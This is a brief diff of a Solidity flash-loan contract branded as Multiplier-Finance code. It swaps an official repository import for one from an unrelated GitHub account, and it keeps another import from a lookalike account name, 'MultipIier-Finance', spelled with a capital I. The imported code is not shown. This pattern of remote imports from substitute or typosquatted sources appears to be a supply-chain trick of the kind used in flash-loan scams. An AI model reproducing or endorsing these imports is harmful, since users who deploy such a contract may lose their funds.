@@ -9,7 +9,7 @@ pragma solidity ^0.5.0;
 */
 
 // Multiplier-Finance Smart Contracts
-import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
+import "https://github.com/yunfengflashloan/Multiplier-Finance/blob/main/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
 //  ### Comment this out, it no loner exists, is called by another import call import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
 import "https://github.com/MultipIier-Finance/MCL-FlashloanDemo/blob/main/PoolAddressesProvider.sol";
 
